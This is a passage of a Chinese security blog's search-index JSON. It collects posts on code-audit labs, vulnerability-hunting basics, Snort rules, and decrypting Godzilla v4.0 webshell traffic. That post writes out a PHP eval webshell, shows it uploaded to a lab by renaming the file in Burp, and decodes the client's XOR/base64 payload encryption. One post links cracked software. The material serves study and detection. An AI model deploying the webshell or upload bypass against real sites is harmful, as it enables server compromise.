打印完成信息&#125;","categories":[{"name":"Golang","slug":"Golang","permalink":"https://gryffinbit.top/categories/Golang/"}],"tags":[{"name":"go","slug":"go","permalink":"https://gryffinbit.top/tags/go/"}],"author":"Gryffinbit"},{"title":"FastJson的全系列学习","slug":"FastJson的全系列学习","date":"2023-06-06T15:32:59.000Z","updated":"2024-08-27T02:28:08.000Z","comments":true,"path":"2023/06/06/FastJson的全系列学习/","permalink":"https://gryffinbit.top/2023/06/06/FastJson%E7%9A%84%E5%85%A8%E7%B3%BB%E5%88%97%E5%AD%A6%E4%B9%A0/","excerpt":"","text":"FastJson的基本介绍fastjson是一个JAVA库，可以实现使用json传输复杂的数据，可以将JAVA对象转换为Json字符串。 参考链接【两万字原创长文】完全零基础入门Fastjson系列漏洞（基础篇） (qq.com)","categories":[{"name":"JAVA安全","slug":"JAVA安全","permalink":"https://gryffinbit.top/categories/JAVA%E5%AE%89%E5%85%A8/"}],"tags":[{"name":"Fastjson","slug":"Fastjson","permalink":"https://gryffinbit.top/tags/Fastjson/"}],"author":"Gryffinbit"},{"title":"代码审计（bluecms）","slug":"代码审计（bluecms）","date":"2023-03-14T14:58:28.000Z","updated":"2024-08-27T02:28:09.000Z","comments":true,"path":"2023/03/14/代码审计（bluecms）/","permalink":"https://gryffinbit.top/2023/03/14/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%EF%BC%88bluecms%EF%BC%89/","excerpt":"","text":"参考文章https://xz.aliyun.com/t/11553#toc-5 CMS结构123456├── admin 后台管理目录├── install 网站的安装目录├── api 接口文件目录├── data 系统处理数据相关目录├── include 用来包含的全局文件└── template 模板 函数集文件，它的定义如下 这类文件通常命名中包含functions或者common等关键字，这些文件里面是一些公共的函数，提供给其他文件统一调用，所以大多数文件都会在文件头部包含到它们，寻找这些文件一个非常好用的技巧就是去打开index.php或者一些功能性文件，在头部一般都能找到。 配置文件，它的定义如下 这类文件通常命名里面包括config这个关键字，配置文件包括Web程序运行必须的功能性配置选项以及数据库等配置信息，从这个文件里面可以了解程序的小部分功能，另外看这个文件的时候注意观察配置文件中参数值是用单引号还是用的双引号包起来，如果是双引号，则很大可能会存在代码执行漏洞。 bluecms 1.6 sp1下载地址 https://gryffinbit.lanzouo.com/iKivl0q2aczg 特点 部署windows上部署phpstudy，在phpstudy上面部署cms 番外 记录一下我在Ubuntu 22.04.1 LTS 上部署的失败过程 apache+mysql+php。 ​ 部署一个万年老cms，路径放好（apache 的 &#x2F;var&#x2F;www&#x2F;下面），嗯怎么不行？查资料发现，哦，apache需要手动开启一些对php文件的编译。开启以后，还是不行。​ 我就以为是伪静态的问题，就去改那个.htaccess。​ 还是不行，不过可以显示500了，服务器内部报错，于是我就打开了php的报错，发现php8不支持一个函数的调用。我就去改那个代码，把那个版本改了一下，就改了一下if的判断，对版本的筛选，结果可好，报错都不报了，直接白屏。​ 我就去看改代码前的报错文件，发现应该是需要用php5.1的环境。​ 我想，终于，终于可以解决了，在ubuntu上安装php5.1就好啦。​ 结果呵呵，我怎么着也找不到apt的php5的包，于是我就注意了一下我的ubuntu版本，Ubuntu 22.04.1 LTS，又去对照ubuntu版本，发现，嗯，最新的ubuntu已经不支持php5啦（阴阳怪气脸）。​ 真好，我的web入门就这样结束啦，一套完整的碰壁过程～​ 一路探索，跟尼玛破案一样。 最开始还尝试了使用Linux的phpstudy，也失败了。 apache安装之后，无法直接解析php，需要安装配置 1apt-get install libapache2-mod-php8.0 1vim /etc/apache2/apache2.conf 添加内容 12AddHandler php8.1-script .php .htmlAddType text/html .php. html 修改为Require all granted 项目部署的时候，打开php的错误显示 1vim /etc/php/8.1/apache2/php.ini 修改display_errors = OFF为display_errors = 1 在phpstudy上配置 PHPStudy 安装 1wget -O install.sh https://notdocker.xp.cn/install.sh &amp;&amp; sudo bash install.sh 管理面板端口为9080","categories":[{"name":"漏洞挖掘","slug":"漏洞挖掘","permalink":"https://gryffinbit.top/categories/%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98/"}],"tags":[{"name":"代码审计","slug":"代码审计","permalink":"https://gryffinbit.top/tags/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"},{"name":"bluecms","slug":"bluecms","permalink":"https://gryffinbit.top/tags/bluecms/"}],"author":"Gryffinbit"},{"title":"漏洞挖掘新手学习记录/代码审计入坑（思路）","slug":"漏洞挖掘新手学习记录（思路）","date":"2023-03-13T17:26:21.000Z","updated":"2024-08-27T02:28:10.000Z","comments":true,"path":"2023/03/14/漏洞挖掘新手学习记录（思路）/","permalink":"https://gryffinbit.top/2023/03/14/%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98%E6%96%B0%E6%89%8B%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95%EF%BC%88%E6%80%9D%E8%B7%AF%EF%BC%89/","excerpt":"","text":"代码审计是在一个编程中对源代码旨在发现错误、安全漏洞或违反编程约定的项目。就是找它这些代码中可能存在问题的地方，然后看它是否真的存在漏洞。 代码审计大致分为三种，白盒、黑盒和灰盒。 白盒：这种测试可以看到源代码，直接从代码中来看哪里可能出现问题，然后进行检测，此时是知道内部结构的，测试相对黑盒测试会比较容易一点 黑盒：只知道网页的大致结构，然后对各个功能开始检测，按自己的思路进行测试，比如看到留言界面，测试XSS，看到登录界面，测试SQL注入等 灰盒：介于白盒测试与黑盒测试之间，自己测试的同时结合代码来看 代码审计可以先从简单的CMS入手。 学习路径的话，可以分两条，一条就是正向的找代码审计的文，跟着去做去学。另一条就是复现漏洞，看漏洞成因，学习代码的分析，由此了解漏洞是如何被发现的。 代码审计脑图https://upload-images.jianshu.io/upload_images/25142717-c0951ef9b097e432.png 漏洞平台 信息收集子域名收集网段扩展域名whois：注册人、联系邮箱 ip段：确定核心段、边缘段、云服段、目标厂商开发喜欢什么框架 工具漏洞扫描 扫描器容易被ban，可以手动注入自己试。 XSS、SQL注入、CSRF、权限绕过、文件上传、弱口令、代码执行等等。 AWVS 漏洞扫描macOS上安装docker。访问127.0.0.1:13443 12awvs13 username: admin@admin.comawvs13 password: Admin123 BBscan轻量级扫描器 重点放在路径的扫描，找有没有403、404的站点。 爆破API接口端点、路径。 BBscan 项目地址 1https://github.com/lijiejie/BBScan BBscan 使用教程 1https://www.freebuf.com/articles/web/352762.html 手动漏洞排查burpsuite利用插件和xray实现自动化漏扫 抓包、改包、重放、密码爆破 入手点 https://cloud.tencent.com/developer/article/2024097 提交的表单（意见反馈、文件上传） 功能点（付款金额校验、修改密码的sign值替换） 数值溢出 接口利用 任意文件上传 提升危害找到低危后，尝试是否能更进一步提升危害。 练习靶场 漏洞分类👇 靶场练习的时候，同类型的一起练 漏洞类型 分类标签 效果 SQL注入 代码执行 执行部分SQL语句，可能造成命令执行、数据获取、读写文件 XSS 代码执行 有限或无限的Javascript代码执行，可能获取cookie凭证 命令注入 命令执行 直接拼接命令执行系统命令 反序列化 代码执行 有限或无限的执行java代码，或根据gadget的不同执行各类操作，比如读写文件、发起请求等 SSRF 网络请求 有限制或无限制的发起各类请求转发，将部分可控数据通过网络进行转发 加密缺陷 伪造 加解密的问题可以统一归为各类伪造，包括伪造凭证、数据包签名等 任意读 敏感信息获取 读取各类敏感信息 任意写 写文件 写各种文件，通常配合系统机制或者框架机制，任意写文件大概率可以串代码执行或者命令执行 未授权访问 权限校验缺失 权限校验缺失，可以访问各类需要鉴权的接口 内存溢出 代码执行 内存溢出后如果利用成功通常可以造成任意代码执行、改变程序判断条件 RCE的一些组合👇 未授权访问+命令执行 未授权访问+反序列化 未授权访问+任意写+系统机制（PHP的webshell或者Linux的crontab） 未授权访问+SSRF+本地进程未授权+命令注入 加密缺陷可构造凭证+后台命令执行功能 未授权访问+SSRF+内存溢出 OWASP 虚拟机靶场VMware部署到Windows上用，https://sourceforge.net/projects/owaspbwa/ root owaspbwa 登入就会返回靶场地址，直接可以访问靶场。 DVWA部署到本机或者服务器上用 12docker pull sqreen/dvwadocker run -d -t -p 8888:80 sqreen/dvwa sqli-labs部署到本机或者服务器上用 12docker pull acgpiano/sqli-labsdocker run -d -t -p 8888:80 acgpiano/sqli-labs 参考链接https://www.anquanke.com/post/id/223457 https://www.sqlsec.com/2020/04/awvs.html#%E4%B8%8B%E8%BD%BD%E5%9C%B0%E5%9D%80 https://paper.seebug.org/1809/ https://cloud.tencent.com/developer/article/2024097 https://xz.aliyun.com/t/11553","categories":[{"name":"漏洞挖掘","slug":"漏洞挖掘","permalink":"https://gryffinbit.top/categories/%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98/"}],"tags":[{"name":"代码审计","slug":"代码审计","permalink":"https://gryffinbit.top/tags/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"},{"name":"漏洞挖掘","slug":"漏洞挖掘","permalink":"https://gryffinbit.top/tags/%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98/"}],"author":"Gryffinbit"},{"title":"PHP代码审计环境搭建（PHP+mamp pro+PHPSTORM）","slug":"PHP代码审计环境搭建","date":"2023-02-06T11:34:30.000Z","updated":"2024-08-27T02:28:08.000Z","comments":true,"path":"2023/02/06/PHP代码审计环境搭建/","permalink":"https://gryffinbit.top/2023/02/06/PHP%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA/","excerpt":"","text":"系统说明macOS M1，2020，Arm64架构，venture版本 环境搭建代码审计分为静态分析和动态分析。 静态分析：不运行PHP代码的情况下，对PHP源码进行查看分析，从中找出可能存在的缺陷和漏洞。 动态分析：将PHP代码运行起来，通过观察代码运行的状态，如变量内容、函数执行结果等，达到明确代码流程，分析函数逻辑等目的，并从中挖掘出漏洞。 下面的软件部署均为动态分析。 mamp pro安装PHP一键集成环境，使用的软件是mamp pro，通用也可以使用phpstudy等。 软件下载： 链接: https://pan.baidu.com/s/1V6-iMyqhLkgh8z08xx0T5g?pwd=k4v7 提取码: k4v7–来自百度网盘超级会员v6的分享 DMG、zip统一打开密码：xclient.info 如遇：「xxx.app已损坏，打不开。你应该将它移到废纸篓」，请参考：《新手常见问题》中“下载好的DMG 打不开”第二项中内容；如果仅是部分TNT软件闪退打不开，参考《修复TNT和谐软件闪退问题》 Xdebug安装好PHP后，需要安装Xdebug，用于动态分析的扩展。 从官网安装的方式： 在官网下载合适自己平台的版本，https://xdebug.org/download.php。 安装过程： 访问https://xdebug.org/wizard.php，然后在浏览器中访问本地环境的phpinfo页面，把phpinfo的全部输出内容粘贴到wizard中，点击分析，会获得安装指南。 适用mamp pro的话，可以直接从软件中，安装xdebug插件。 mamp的其他配置如下👇 PHP配置和xdebug配置信息 找到php8.2.0.ini 设置一下ide key 检验xdebug是否配置成果 启动服务，点击webstart，进入页面后点击phpinfo，搜索xdebug。 搜得到，且能看到idekey，配置成功 PHPSTORM 配置Mamp pro已经选择了工作目录，运行起来。然后在phpstorm里打开该工作目录，会有一个index.php。进入配置 PHP配置如图，自己看👇 debug配置如图👇 IDE key就是上面xdebug设置的那个 servers配置👇 run&#x2F;debug configuration 1⃣️ 👇 2⃣️ 点击➕，添加php web page，配置如下👇 运行调试设置断点 在那一行的前面点一下 运行 先点一下debug的小虫子，会弹出页面。 再点一下电话，开启监听。最后点击运行，rerun。最终显示调试信息 结束运行时，关掉监听，停止运行。 Firefox xdebug插件为了调试过程更顺利，可以使用firefox的插件。 配置idekey，和前面保持一致 安装插件后运行 firefox访问http://localhost:8888/MAMP/phpinfo.php，打开xdebug 然后在phpstorm，打开电话监听，点击网页中的功能部分，会自动跳到phpstorm中的断点位置。","categories":[{"name":"代码审计","slug":"代码审计","permalink":"https://gryffinbit.top/categories/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"}],"tags":[{"name":"PHP","slug":"PHP","permalink":"https://gryffinbit.top/tags/PHP/"},{"name":"代码审计","slug":"代码审计","permalink":"https://gryffinbit.top/tags/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"}],"author":"Gryffinbit"},{"title":"snort 规则编写经验积累","slug":"snort-规则编写经验积累","date":"2023-01-16T10:20:49.000Z","updated":"2024-08-27T02:28:09.000Z","comments":true,"path":"2023/01/16/snort-规则编写经验积累/","permalink":"https://gryffinbit.top/2023/01/16/snort-%E8%A7%84%E5%88%99%E7%BC%96%E5%86%99%E7%BB%8F%E9%AA%8C%E7%A7%AF%E7%B4%AF/","excerpt":"","text":"https://blog.csdn.net/yalecaltech/article/details/89470968 数据包中的点，可能不是点，是空格。 $HTTP_PORTS 范围，不是这个范围内的，可以用any在/etc/snort.conf里面可以看到web的端口。 1portvar HTTP_PORTS [80,81,311,383,591,593,901,1220,1414,1741,1830,2301,2381,2809,3037,3128,3702,4343,4848,5250,6988,7000,7001,7144,7145,7510,7777,7779,8000,8008,8014,8028,8080,8085,8088,8090,8118,8123,8180,8181,8243,8280,8300,8800,8888,8899,9000,9060,9080,9090,9091,9443,9999,11371,34443,34444,41080,50002,55555] 自己可以修改 正则URL编码：[%\\w]+ 16进制‘\\r’是回车（ 0D），’\\n’是换行（ 0A），前者使光标到行首，后者使光标下移一格对应|0D0A| snort检测数据包1snort -c /etc/snort/snort.conf -A fast -r success.pcap -l /var/log/snort 添加规则 1vim /etc/snort/rules/local.rules 查看告警 1cat /var/log/snort/alert 清除 12echo &quot; &quot;&gt; /var/log/snort/alertecho &quot; &quot;&gt; /etc/snort/rules/local.rules snort需要注意的细节 使用http_method的时候，要相应的规定http的端口（http服务），要限定端口或者是使用$HTTP_PORTS 变量。不然无法触发。 1、byte_extract关键字会使检测指针定位到byte_extract所提取内容后面一个字节的位置，在下一个匹配中用到的relative、distance等都是相对于此位置的。例如用byte_extract提取“00 01 02 03 04 05”中的02 03，那么，指针会移到04的位置。 2、byte_test不会改变检测指针位置。 3、content:!”XXXX”，!否定检测会导致检测指针回到初始位置，也就是说下一个匹配中的relative、distance相对的是整个检测内容的开始位置。 4、byte_jump如果跳到一个不存在的位置，则会导致此规则失效。例如待检内容为b6 5b 00 00 00 06 02 03 00 00 00 01，用byte_jump:2,4; 跳过后到达的是最后一个字节01的下一个字节，但不存在这个字节，因此不管后面的匹配是什么，规则都不会告警了。这种情况可以用byte_extract提取长度，用isdataat判断一下，再用byte_jump跳转。 5、从开源渠道引入规则的时候，如果规则中包含flowbits关键字，一定要把前续和后续规则都一起引入，要不然规则不会起作用。例如有带flowbits:isset的规则，就要找到对应的flowbits:set规则。","categories":[{"name":"杂七杂八","slug":"杂七杂八","permalink":"https://gryffinbit.top/categories/%E6%9D%82%E4%B8%83%E6%9D%82%E5%85%AB/"}],"tags":[],"author":"Gryffinbit"},{"title":"哥斯拉v4.0流量解密及特征流量提取","slug":"哥斯拉v4.0流量解密及特征流量提取","date":"2022-12-26T11:30:18.000Z","updated":"2025-06-10T03:39:07.173Z","comments":true,"path":"2022/12/26/哥斯拉v4.0流量解密及特征流量提取/","permalink":"https://gryffinbit.top/2022/12/26/%E5%93%A5%E6%96%AF%E6%8B%89v4.0%E6%B5%81%E9%87%8F%E8%A7%A3%E5%AF%86%E5%8F%8A%E7%89%B9%E5%BE%81%E6%B5%81%E9%87%8F%E6%8F%90%E5%8F%96/","excerpt":"","text":"哥斯拉软件安装及使用安装项目地址：https://github.com/BeichenDream/Godzilla/releases 下载.jar 文件。 运行 1java -jar godzilla.jar 靶场攻击 php搭建的网站和jsp搭建网站：apache 服务器一般使用PHP搭建。tomcat 服务器一般使用jsp搭建。 木马是要在服务器上自动执行，执行脚本，所以木马格式要与服务器的语言保持一致。比如php的网站，要用php的木马。 访问网站index.php，可以看出是php网站，生成php的马 使用upload的靶场 123docker search upload-labsdocker image pull c0ny1/upload-labsdocker run -d -p 80:8080 c0ny1/upload-labs 使用哥斯拉生成一个木马 后续的实验，都会以该木马为例子。会分析PHP_EVAL_XOR_BASE64的加密方式 将哥斯拉生成的木马上传到靶场 挑一个靶场环境，比如第一个。burp拦截，改包，改成.php再发送。 将生成的木马shell.php 成功上传到目标主机。 哥斯拉连接目标地址：http://ip:8080/upload/shell.php 反编译获得软件源码JD-GUI 反编译下载工具 https://jd-gui.apponic.com/mac/ M1 系统报错： 右键JD-GUI，显示包内容 进入Contents/MacOS文件夹，打开universalJavaApplicationStub.sh文件，使用新版的文件替换，新版文件内容可以在如下地址复制 https://raw.githubusercontent.com/tofi86/universalJavaApplicationStub/master/src/universalJavaApplicationStub 双击打开软件，将需要反编译的jar包拖到软件界面中 选中全部文件，点击File-Save All Sources保存反编译完的源码，选择保存路径 哥斯拉加密分析全套的攻击流程 在客户端生成shell，生成shell的时候可以设置参数，包括：密码、密钥、有效载荷、加密器 密码：Post请求中的参数名称（本次实验的密码为passwd），以及用于和密钥一起进行加密运算。 密钥：用于对请求数据进行加密，不过加密过程中并非直接使用密钥明文，而是计算密钥的md5值，然后取其前16位用于加密过程（本次实验的密钥为keymd，md5值为：083c7c062cb29c75499967759dcd2423） 有效载荷分为ASP、java、php、c#四种类型的payload 加密器分为base64和raw、evalbase64三大类。 扰乱数据：用于自定义HTTP请求头，以及在最终的请求数据前后额外再追加一些扰乱数据，进一步降低流量的特征。 生成shell.php（文件名可自定义，根据选择的有效载荷不同，可以有jsp、php、aspx等文件格式），该shell.php需要上传到攻击的目标主机上。 这个文件，会出现在数据包的POST请求中。 该文件会将密码、密钥的md5值前16位明文写入。 该文件的实现功能还有：将密码和密钥进行拼接，然后进行md5的计算。一共32位。服务器端返回数据的时候，会进行拼接。即服务器端返回数据 &#x3D; md5前16位+加密数据+md5后16位。（加密数据可以通过对服务器端的解密算法进行解密） 哥斯拉客户端进行连接 URL是目标主机上的shell.php 请求配置的参数，可以添加冗余数据，该冗余数据会在数据的正式内容的前后添加进去。 连接成功后，进入shell便可以进行操作。 生成的shell以PHP_EVAL_XOR_BASE64的加密方式为例。生成的木马shell.php内容为 12&lt;?phpeval($_POST[&quot;passwd&quot;]); 它的工作原理是，存在一个变量“passwd”，“passwd”的取值为http的post方式。web服务器对“passwd“取值后，然后通过eval()函数执行“passwd”里面的内容。比如说，将该shell.php的文件传入站点，以POST方式传入passwd=phpinfo();。则页面会显示phpinfo的信息。 该变量“passwd”，是最开始生成shell，自己设置的密码。 抓包分析-查看“测试连接”操作会产生的数据包设置代理，用burpsuite拦截，查看产生的数据包 会产生三个数据包。并且会设置PHPSESSID。 从数据包中可以发现。request中发送的数据包，是passwd=xxxx 的形式。根据生成木马shell.php中的内容可知。web服务器对“passwd“取值后，然后通过eval()函数执行“passwd”里面的内容。即实际操作内容是passwd后面一大串加密过的字符。 对第一个数据包进行分析追溯连接时，功能代码部分在core/shell/ShellEntity.java 找到initShellOpertion()函数 该方法首先初始化一个Http对象赋值给ShellEntity对象的http成员变量(每个ShellEntity对象都有自己的http成员变量, 用于各ShellEntity的Http请求), 然后初始化payloadModel 和 cryptionModel 对象。 运行的时候，会调用init方法进行初始化。以及调用了test函数，对状态进行了判断。所以进一步分析这两个函数。 因为代码是反编译过来的，所以不能直接用ctrl定位到方法的定义，需要手动去找。 init方法 （路径shells/cryptions/phpXor/PhpEvalXor.java init中的变量ShellEntity shellContext，为连接信息。 this.shell = context;将webshell配置界面修改的内容同步到shellContext对象上。 1234567891011121314151617181920/* */ public ShellEntity(boolean useCache) &#123;/* 55 */ this.url = &quot;&quot;;/* 56 */ this.password = &quot;&quot;;/* 57 */ this.secretKey = &quot;&quot;;/* 58 */ this.payload = &quot;&quot;;/* 59 */ this.cryption = &quot;&quot;;/* 60 */ this.remark = &quot;&quot;;/* 61 */ this.encoding = &quot;&quot;;/* 62 */ this.headers = new HashMap&lt;&gt;();/* 63 */ this.reqLeft = &quot;&quot;;/* 64 */ this.reqRight = &quot;&quot;;/* 65 */ this.connTimeout = 60000;/* 66 */ this.readTimeout = 60000;/* 67 */ this.proxyType = &quot;&quot;;/* 68 */ this.proxyHost = &quot;&quot;;/* 69 */ this.proxyPort = 8888;/* 70 */ this.id = &quot;&quot;;/* 71 */ this.useCache = useCache;/* */ &#125; this.http = this.shell.getHttp(); 其中getHttp()函数获取到传入该方法的ShellEntity对象的http成员变量。 getHttp()函数（路径core/shell/ShellEntity.java 123/* */ public Http getHttp() &#123;/* 120 */ return this.http;/* */ &#125; this.key 这一行，是逐字节的获取密钥key。 this.pass 这一行，是逐字节的获取密码password。 String findStrMd5 这一行，是将密钥key和password加起来，已经进行md5的计算。 this.findStrLeft 这一行，是获取md5的前16位（生成的md5一共有32位） this.findStrRight 这一行，是获取md5的后16位（生成的md5一共有32位） this.evalContent 这一行，是进行了一套编码过程。经过了base64和url的编码处理和密钥的处理。 需要传入密钥、密钥md5的前16位，然后再放入eval函数中”&lt;?php” 12345678/* */ public String generateEvalContent() &#123;/* 112 */ String eval = (new String(Generate.GenerateShellLoder(this.shell.getSecretKey(), functions.md5(this.shell.getSecretKey()).substring(0, 16), false))).replace(&quot;&lt;?php&quot;, &quot;&quot;);/* 113 */ eval = functions.base64EncodeToString(eval.getBytes());/* 114 */ eval = (new StringBuffer(eval)).reverse().toString();/* 115 */ eval = String.format(&quot;eval(base64_decode(strrev(urldecode(&#x27;%s&#x27;))));&quot;, new Object[] &#123; URLEncoder.encode(eval) &#125;);/* 116 */ eval = URLEncoder.encode(eval);/* 117 */ return eval;/* */ &#125; 获取到http成员变量后, 因为该http成员变量有ShellEntity对象的相关信息, 包括连接url、代理、password、secretKey等内容, 即保存有对应的webshell配置信息, 因此可以直接对相关的webshell发起请求。通过 this.http.sendHttpResponse(this.payload);发送了请求。 也就是第一个数据包。 对2、3数据包进行追溯（2、3数据包内容一样）test 方法。test()函数 是一个布尔型的。测试成功后，会返回true。if函数顺利运行，连接成功。 1234567891011/* */ public boolean test() &#123;/* 222 */ ReqParameter parameter = new ReqParameter();/* 223 */ byte[] result = evalFunc(null, &quot;test&quot;, parameter);/* 224 */ String codeString = new String(result);/* 225 */ if (codeString.trim().equals(&quot;ok&quot;)) &#123;/* 226 */ this.isAlive = true;/* 227 */ return true;/* */ &#125; /* 229 */ Log.error(codeString);/* 230 */ return false;/* */ &#125; trim() 函数移除字符串两侧的空白字符或其他预定义字符。 test()的执行过程为：调用了evalFunc函数。该函数将数据POST给服务器，并获得服务器的响应。 1byte[] result = evalFunc(null, &quot;test&quot;, parameter); // 获得服务器的响应 将服务器的返回结果格式修改后，与ok对比，判断为ok则连接成功。 123456String codeString = new String(result);if (codeString.trim().equals(&quot;ok&quot;)) &#123; // 对字符串进行格式修改，使之没有空格。服务器返回ok的话，则连接成功 return true; &#125; 说明在evalFunc函数执行过程中，已经得到了明文的服务器返回数据，因此服务器返回报文的解密过程肯定是在evalFunc函数中。 查看evalFunc 函数（路径shells/payloads/php/PhpShell.java），通过this.http.sendHttpResponse(data).getResult();发送了请求数据包，也就是第2、3个数据包。 1234567891011121314/* */ public byte[] evalFunc(String className, String funcName, ReqParameter parameter) &#123;/* 100 */ fillParameter(className, funcName, parameter);/* 101 */ byte[] data = parameter.formatEx();/* 102 */ if (this.gzipDecodeMagic == 1) &#123;/* 103 */ data = functions.gzipE(data);/* */ &#125;/* */ /* 106 */ byte[] result = this.http.sendHttpResponse(data).getResult();/* 107 */ if ((this.gzipEncodeMagic == -1 || this.gzipEncodeMagic == 1) &amp;&amp; functions.isGzipStream(result)) &#123;/* 108 */ result = functions.gzipD(result);/* */ &#125;/* 110 */ return result;/* */ &#125;/* */ 对sendHttpResponse相关的数据包请求方法进行分析代码路径：util/http/Http.java 12345678910111213/* */ public HttpResponse sendHttpResponse(Map&lt;String, String&gt; header, byte[] requestData, int connTimeOut, int readTimeOut) &#123;/* 84 */ requestData = this.shellContext.getCryptionModule().encode(requestData);/* */ /* 86 */ String left = this.shellContext.getReqLeft();/* 87 */ String right = this.shellContext.getReqRight();/* 88 */ if (this.shellContext.isSendLRReqData()) &#123;/* 104 */ byte[] leftData = left.getBytes();/* 105 */ byte[] rightData = right.getBytes();/* 106 */ requestData = (byte[])functions.concatArrays(functions.concatArrays(leftData, 0, ((leftData.length &gt; 0) ? leftData.length : 1) - 1, requestData, 0, requestData.length - 1), 0, leftData.length + requestData.length - 1, rightData, 0, ((rightData.length &gt; 0) ? rightData.length : 1) - 1);/* */ &#125; /* */ /* 109 */ return SendHttpConn(this.shellContext.getUrl(), this.requestMethod, header, requestData, connTimeOut, readTimeOut, this.proxy);/* */ &#125; 该段代码调用了getCryptionModule()对请求数据进行了加密，后面对数据部分进行了剥离，删除了加在真实数据左右两边的冗杂数据（shell设定时添加的多余数据） 加密函数分析encode路径shells/cryptions/phpXor/PhpEvalXor.java 12345678910111213141516/* */ public byte[] encode(byte[] data) &#123;/* */ try &#123;/* 57 */ return E(data);/* 58 */ &#125; catch (Exception e) &#123;/* 59 */ Log.error(e);/* 60 */ return null;/* */ &#125; /* */ &#125;/* */ public byte[] E(byte[] cs) &#123;/* 87 */ int len = cs.length;/* 88 */ for (int i = 0; i &lt; len; i++) &#123;/* 89 */ cs[i] = (byte)(cs[i] ^ this.key[i + 1 &amp; 0xF]);/* */ &#125;/* 91 */ return (String.format(&quot;%s=%s&amp;&quot;, new Object[] &#123; this.pass, this.evalContent &#125;) + this.shell.getSecretKey() + &quot;=&quot; + URLEncoder.encode(functions.base64EncodeToString(cs))).getBytes();/* */ &#125; evalContent的内容是：👇 12345678/* */ public String generateEvalContent() &#123;/* 112 */ String eval = (new String(Generate.GenerateShellLoder(this.shell.getSecretKey(), functions.md5(this.shell.getSecretKey()).substring(0, 16), false))).replace(&quot;&lt;?php&quot;, &quot;&quot;);/* 113 */ eval = functions.base64EncodeToString(eval.getBytes());/* 114 */ eval = (new StringBuffer(eval)).reverse().toString();/* 115 */ eval = String.format(&quot;eval(base64_decode(strrev(urldecode(&#x27;%s&#x27;))));&quot;, new Object[] &#123; URLEncoder.encode(eval) &#125;);/* 116 */ eval = URLEncoder.encode(eval);/* 117 */ return eval;/* */ &#125; 所以最终发送的数据包是拼接的，内容是：password密码=evalContent + 密钥key + = + 对要发送的数据先base64编码，再进行异或运算，再url编码 密码和密钥都是明文传输的，”&#x3D;“ 也是明文传输 其中evalContent的内容格式是： 先在GenerateShellloder中寻找&lt;?php并用&quot; &quot;替换掉，也就是删除&quot;&lt;?php&quot;的功能， 然后逐字节获取eval的内容进行base64编码后再转换为string类型的。 对eval先进行encode函数加密（按位异或），再进行url编码，得到的数据放入到格式eval(base64_decode(strrev(urldecode(&#39;%s&#39;))));中，%s为要填入数据的位置。 将第3步获得的数据，最终进行encode函数加密（按位异或），再进行url编码。最终得到的是evalContent 最后数据包的内容，根据evalFunc可以发现，在数据包发送出去之后，还进行了gzip的压缩（路径 shells/payloads/php/PhpShell.java）。所以要先对数据进行gzip解压缩，再所有数据进行解密 1234567891011121314/* */ public byte[] evalFunc(String className, String funcName, ReqParameter parameter) &#123;/* 100 */ fillParameter(className, funcName, parameter);/* 101 */ byte[] data = parameter.formatEx();/* 102 */ if (this.gzipDecodeMagic == 1) &#123;/* 103 */ data = functions.gzipE(data);/* */ &#125;/* */ /* 106 */ byte[] result = this.http.sendHttpResponse(data).getResult();/* 107 */ if ((this.gzipEncodeMagic == -1 || this.gzipEncodeMagic == 1) &amp;&amp; functions.isGzipStream(result)) &#123;/* 108 */ result = functions.gzipD(result);/* */ &#125;/* 110 */ return result;/* */ &#125;/* */ 数据包： 1passwd=eval%28base64_decode%28strrev%28urldecode%28%27%253DoQD9pQD9BCIgAiCN0HIgACIgACIgoQD7kSeltGJsEGdhRGJoUGZvNmbl1TXl1WYORWYvxWehBHJb50TJN1UFN1XkACIgACIgACIgACIgoQD7lSZzxWYm1TPhkiIvZmbJN3YpNXYCRXZnJCLhRXYkRCKz9GcyR3coAiZpBCIgACIgACIK0welNHbl1HIgACIK0wOpYTMskSeltGJuM3chBHJoUDZthic0NnY1NHIvh2YlBCIgACIgACIK0wOpkSeltGJskSY0FGZkgib1JHQoUGZvNmblhSZk92YuV2X0YTZzFmYg8GajVGIgACIgACIgoQD7kiNxwCMskSeltGJuM3chBHJoUDZthic0NnY1NHIvh2YlBCIgACIgACIK0wOpQWYvxWehBHJowWY2VWCJoQD9BCIgACIgACIK0wOpkXZrRCLkF2bslXYwRCKlR2bj5WZ9QWYvxWehBHJgACIgACIgACIgACIK0wepU2csFmZ90TPpIybm5WSzNWazFmQ0V2ZiwCZh9Gb5FGckgycvBnc0NHKgYWagACIgACIgAiCNsTK5V2akwSXl1WYORWYvxWehBHJb50TJN1UFN1XkgSZk92YuVWPkF2bslXYwRCIgACIgACIgoQD7lSKdVWbh5EZh9Gb5FGckslTPl0UTV0UfRCK0V2czlGKgYWagACIgoQD7kSeltGJskSXzNXYwRyWUN1TQ9FJoUGZvNWZk9FN2U2chJGKlR2bj5WZ9EGdhRGJgACIgoQD7lSKdN3chBHJbR1UPB1XkgCdlN3cphCImlmCNszJ1czY5IjYjJjNwM2NjNDOwcSP5V2akoQD7cCZh9Gb5FGcn0TZtFmTkF2bslXYwRiCNszJk1Welt2J9M3chBHJK0QfK0wOERCIuJXd0VmcgACIgoQD9BCIgAiCNszYk4VXpRyWERCI9ASXpRyWERCIgACIgACIgoQD70VNxYSMrkGJbtEJg0DIjRCIgACIgACIgoQD7BSKrsSaksTKERCKuVGbyR3c8kGJ7ATPpRCKy9mZgACIgoQD7lySkwCRkgSZk92YuVGIu9Wa0Nmb1ZmCNsTKwgyZulGdy9GclJ3Xy9mcyVGQK0wOpADK0lWbpx2Xl1Wa09FdlNHQK0wOpgCdyFGdz9lbvl2czV2cApQD%27%29%29%29%29%3B&amp;keymd=VVYXXwxUeFMOBzA9Yzc1RF1AFw%3D%3D 最终解密流程： 12计算出 md5 (pass + key), 对响应包截取该md5后的前16位以及后16位 